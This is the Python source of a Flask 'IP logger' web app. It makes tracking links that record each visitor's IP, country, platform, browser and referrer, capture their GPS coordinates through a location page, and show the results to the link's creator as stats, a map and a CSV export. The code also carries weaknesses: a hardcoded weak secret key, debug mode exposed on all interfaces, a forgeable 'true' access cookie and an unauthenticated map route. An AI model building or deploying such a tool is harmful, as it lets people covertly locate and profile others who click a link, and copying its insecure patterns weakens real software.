
from flask import Flask, render_template, request, redirect, url_for, make_response, Response, abort
import sqlite3
import uuid
from datetime import datetime
import io
import csv
from functools import wraps

app = Flask(__name__)
app.config['DATABASE'] = 'iplogger.db'
app.config['SECRET_KEY'] = '123564'

def get_db_connection():
    conn = sqlite3.connect(app.config['DATABASE'])
    conn.row_factory = sqlite3.Row
    return conn

def require_cookie(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        link_id = kwargs.get('link_id')
        if not link_id:
            return redirect(url_for('index'))
        if request.cookies.get(f'access_{link_id}') != 'true':
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

def init_db():
    conn = get_db_connection()
    with conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS logs
                (id INTEGER PRIMARY KEY AUTOINCREMENT,
                 link_id TEXT NOT NULL,
                 ip TEXT,
                 country TEXT,
                 platform TEXT,
                 browser TEXT,
                 referrer TEXT,
                 latitude REAL,
                 longitude REAL,
                 timestamp DATETIME)''')
        c.execute('''CREATE TABLE IF NOT EXISTS links
                (id TEXT PRIMARY KEY,
                 created_at DATETIME,
                 target_url TEXT)''')

        c.execute("PRAGMA table_info(logs)")
        columns = {col['name'] for col in c.fetchall()}

        for column in ['latitude', 'longitude']:
            if column not in columns:
                c.execute(f"ALTER TABLE logs ADD COLUMN {column} REAL")

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create', methods=['POST'])
def create_link():
    link_id = str(uuid.uuid4())[:8]
    target_url = request.form.get('target_url', url_for('show_map', link_id=link_id))  # Corrected this line
    created_at = datetime.now()

    conn = get_db_connection()
    with conn:
        c = conn.cursor()
        c.execute("INSERT INTO links (id, created_at, target_url) VALUES (?, ?, ?)",
                 (link_id, created_at, target_url))

    resp = make_response(redirect(url_for('stats', link_id=link_id)))
    resp.set_cookie(f'access_{link_id}', 'true', max_age=60*60*24*365)
    return resp

@app.route('/track/<link_id>', methods=['GET', 'POST'])
def track(link_id):
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT target_url FROM links WHERE id = ?", (link_id,))
    target = c.fetchone()

    if not target:
        conn.close()
        abort(404)

    redirect_url = target['target_url']

    if request.method == 'POST':
        data = request.json
        with conn:
            c.execute('''UPDATE logs SET
                      latitude = ?,
                      longitude = ?
                      WHERE id = ?''',
                    (data['lat'], data['lon'], data['log_id']))
        conn.close()
        return 'OK'

    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referrer = request.referrer
    timestamp = datetime.now()

    platform = 'Unknown'
    browser = 'Unknown'

    if 'Windows' in user_agent:
        platform = 'Windows'
    elif 'Linux' in user_agent:
        platform = 'Linux'
    elif 'Mac' in user_agent:
        platform = 'MacOS'
    elif 'iPhone' in user_agent:
        platform = 'iPhone'
    elif 'Android' in user_agent:
        platform = 'Android'

    if 'Chrome' in user_agent:
        browser = 'Chrome'
    elif 'Firefox' in user_agent:
        browser = 'Firefox'
    elif 'Safari' in user_agent:
        browser = 'Safari'
    elif 'Edge' in user_agent:
        browser = 'Edge'
    elif 'Opera' in user_agent:
        browser = 'Opera'

    country = 'Unknown'
    try:
        from ip2geotools.databases.noncommercial import DbIpCity
        res = DbIpCity.get(ip, api_key='free')
        country = res.country
    except Exception as e:
        print(f"Error during geolocation: {e}")
        pass

    with conn:
        c = conn.cursor()
        c.execute('''INSERT INTO logs
                  (link_id, ip, country, platform, browser, referrer, timestamp)
                  VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (link_id, ip, country, platform, browser, referrer, timestamp))
        log_id = c.lastrowid

    conn.close()

    return render_template('get_location.html',
                           redirect_url=redirect_url,
                           log_id=log_id,
                           link_id=link_id)

@app.route('/show_map/<link_id>')
def show_map(link_id):
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("SELECT latitude, longitude FROM logs WHERE link_id = ? ORDER BY timestamp DESC LIMIT 1", (link_id,))
    location_data = c.fetchone()
    conn.close()

    if location_data:
        latitude = location_data['latitude']
        longitude = location_data['longitude']
        return render_template('map.html', latitude=latitude, longitude=longitude, link_id=link_id)
    else:
        return "No location data found yet. Please visit the tracking link first.", 404


@app.route('/stats/<link_id>')
@require_cookie
def stats(link_id):
    tracking_url = f"{request.host_url}track/{link_id}"

    conn = get_db_connection()
    c = conn.cursor()

    c.execute('''SELECT
                COUNT(*) as total_clicks,
                COUNT(DISTINCT ip) as unique_visitors,
                country,
                platform,
                browser,
                latitude,
                longitude
             FROM logs
             WHERE link_id = ?
             GROUP BY country, platform, browser, latitude, longitude
             ORDER BY total_clicks DESC''', (link_id,))
    stats = c.fetchall()

    c.execute('''SELECT * FROM logs
              WHERE link_id = ?
              ORDER BY timestamp DESC
              LIMIT 50''', (link_id,))
    logs = c.fetchall()

    conn.close()

    return render_template('stats.html',
                         stats=stats,
                         logs=logs,
                         link_id=link_id,
                         tracking_url=tracking_url)

@app.route('/export/<link_id>/csv')
@require_cookie
def export_csv(link_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''SELECT * FROM logs WHERE link_id = ?''', (link_id,))
    data = c.fetchall()
    conn.close()

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', 'Link ID', 'IP', 'Country', 'Platform',
                   'Browser', 'Referrer', 'Latitude', 'Longitude', 'Timestamp'])

    for row in data:
        writer.writerow(row)

    output.seek(0)

    return Response(
        output,
        mimetype="text/csv",
        headers={"Content-Disposition":
                f"attachment;filename={link_id}_logs.csv"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
